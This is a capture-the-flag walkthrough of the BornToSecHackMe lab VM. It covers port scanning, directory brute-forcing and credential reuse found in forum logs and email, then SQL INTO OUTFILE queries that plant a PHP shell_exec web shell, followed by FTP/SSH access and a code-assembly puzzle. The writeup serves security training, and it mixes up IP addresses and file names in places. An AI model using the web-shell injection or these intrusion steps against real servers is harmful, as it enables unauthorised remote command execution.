Launch given .iso file with Virtual Box

Scan for its IP adress.

In our case, it is 10.111.1.24

Then we need to find the open ports on this system. To perform it we can use Nmap tool. If it is not installed on the machine, type:

"brew install nmap"

Scan a range of IPs starting with an IP address found step before. Type in terminal:

"nmap 10.111.1.24"

We receive available ports on the system. Our output:

> nmap 10.111.1.24
> Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-26 19:58 EEST
> Nmap scan report for 10.111.1.24
> Host is up (0.11s latency).
> Not shown: 994 closed ports
> PORT    STATE SERVICE
> 21/tcp  open  ftp
> 22/tcp  open  ssh
> 80/tcp  open  http
> 143/tcp open  imap
> 443/tcp open  https
> 993/tcp open  imaps

We have several open ports through which we can try to hack the system.

We have an open http port (80) for 10.111.1.24. So we can look for existing Web Objects. To do it we use DIRB package (github.com/v0re/dirb.git). To install it (if not yet installed) just clone the repo and "make" the programm:

1) "git clone https://github.com/v0re/dirb.git"
2) "dirb"
3) "./configure"
4) "make"

To find the entries launch the following:

"./dirb https://10.111.1.24/ wordlists/common.txt"

It gives us many web directories, main of them are: 
	
	- https://10.111.1.24/phpmyadmin/
	- https://10.111.1.24/webmail/
	- https://10.111.1.24/forum/

Let's explore them. https://10.111.1.24.134/phpmyadmin/ requires login and password. The same thing for https://10.111.1.24/webmail/. Let's try to find some information on the forum (https://192.168.140.134/forum/). There are four topics on the forum. We observe the topic "Probleme login ?". We can find Failed password for invalid user !q\]Ej?*5K5cy*AJ

> Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2

A little bit later, on Oct 5 08:46:01, the session was opened for user lmezard:

> Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)

We can assume that invalid user !q\]Ej?*5K5cy*AJ actually is a password for lmezard user. Try to login. It is 
successful. After login we can look for some information in the lmezard profile. We have here just an E-mail address: laurie@borntosec.net

Now with this E-mail address we can try to get the mail of lmezard accessing to the page https://10.111.1.24/webmail/ we found earlier with DIRB.

Successful. Here we have two mails. One of them is called "DB Access". Inside we have:

> Hey Laurie,
> You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
> Best regards.

We can try to use this login and password to acces the third directory found using DIRB - https://10.111.1.24/phpmyadmin/. Use login root and password Fg-'kKXBj87E:aJ$
Login successful. 

PHP-MyAdmin is a GUI based interface for MySQL database. Next step we will to try to attack this database to access shell.
We will use command shell_exec â€” Execute command via shell and return the complete output as a string. 
The problem is where to store the output. We will use all the directories found using DIRB tool earlier:



SELECT "<?php echo shell_exec($_GET['cmd']); ?> " INTO OUTFILE "/var/www/forum/1.php"

> #1 - Can't create/write to file '/var/www/forum/1.php' (Errcode: 13)

SELECT "<?php echo shell_exec($_GET['cmd']); ?> " INTO OUTFILE "/var/www/phpmyadmin/1.php"

> #1 - Can't create/write to file '/var/www/phpmyadmin/1.php' (Errcode: 2)

SELECT "<?php echo shell_exec($_GET['cmd']); ?> " INTO OUTFILE "/var/www/webmail/1.php"

> #1 - Can't create/write to file '/var/www/webmail/1.php' (Errcode: 2)

SELECT "<?php echo shell_exec($_GET['cmd']); ?> " INTO OUTFILE "/var/www/forum/js/1.php"

> #1 - Can't create/write to file '/var/www/forum/js/1.php' (Errcode: 13)

SELECT "<?php echo shell_exec($_GET['cmd']); ?> " INTO OUTFILE "/var/www/forum/lang/1.php"

> #1 - Can't create/write to file '/var/www/forum/lang/1.php' (Errcode: 13)

SELECT "<?php echo shell_exec($_GET['cmd']); ?> " INTO OUTFILE "/var/www/forum/modules/1.php"

> #1 - Can't create/write to file '/var/www/forum/modules/1.php' (Errcode: 13)

SELECT "<?php echo shell_exec($_GET['cmd']); ?> " INTO OUTFILE "/var/www/forum/templates_c/1.php"

> Your SQL query has been executed successfully ( Query took 0.0001 sec )



Successful. The output was stored on https://10.111.1.24/forum/templates_c/1.php in templates_c folder.

We can add shell commands to the end of the address string and get its output on this page. 

First, we can look at the /home directory. Type afther the address string https://10.111.1.24/forum/templates_c/1.php the following:

?cmd=ls /home

The output is:

> LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz

We have there seven directories: LOOKATME, ft_root, laurie, laurie@borntosec.net, lmezard, thor, zaz. Let's look what we have inside them.

In the directory LOOKATME there is a file "password". Other directories are empty. Lets look what is inside the "password" file. Type after the address string:

?cmd=cat /home/LOOKATME/password

The output is:

lmezard:G!@M6f4Eatau{sF"

So we have login and password: lmezard	G!@M6f4Eatau{sF"


Now we can try to connect through ssh or ftp ports using obtained login and password. For these proposes we need installed inetutils tool:

"brew install inetutils"

"ftp 10.111.1.24"

It requires Name and Password. Try to login. 

> 230 Login successful.

Here we have 2 files: 


ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.


Let's download these files:

ftp> get README
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for README (96 bytes).
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
96 bytes received in 0.000158 seconds (593 kbytes/s)
ftp> get fun
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for fun (808960 bytes).
WARNING! 2764 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
808960 bytes received in 0.089 seconds (8.67 Mbytes/s)
ftp> quit
221 Goodbye.


Let's check what types of files do we have. Use command "file" to understand it:

"file README"

> README: ASCII text

"file fun"

> fun: POSIX tar archive (GNU)


Inside README file we have the following information:

"cat README"

> Complete this little challenge and use the result as password for user 'laurie' to login in ssh


We see that the other file is an archive. Untar it using "tar -xvf" command:

"tar -xvf fun"

As a result, we have the directory ft_fun.

"cd ft_fun"
"ls -l | wc"

> 		751    6752   45011

Here we have 750 files. Example:

"cat 99VAL.pcap"


> void useless() {

> //file60%

In every file we have a line of some code and the number of this file. We can guess that we can combine these files to have this code. First we need to arrange these files according their numbers in ascending order. Let's use this script to rename the files as they are in their content after "//file":


"for file in *.pcap; do
text="$(grep -a "//file" "$file" | awk -F '//file' '{print $2}')"
grep -v "//file" "$file" > temp && mv temp "$file"
mv "$file" "$text.pcap"
done"


Then concatenate all the files in ascending order:


"cat $(find ./ -name "*.pcap" | sort -V) > code.cpp"


We received file with a code. Now let's compile and execute it:

"gcc newfile.cpp"
"./a.out"

> MY PASSWORD IS: Iheartpwnage
> Now SHA-256 it and submit

Let's generate SHA-256 encription of this password using https://emn178.github.io/online-tools/sha256.html

The result is:
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4


Now we will follow instructions in README and will try to login in ssh with login laurie and this coded password.

"ssh laurie@10.111.1.24"

"ls"
> bomb  README

Let's check what the types of files do we have:

"file README"
> README: ASCII text

"file bomb"
> bomb: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.0.0, not stripped




















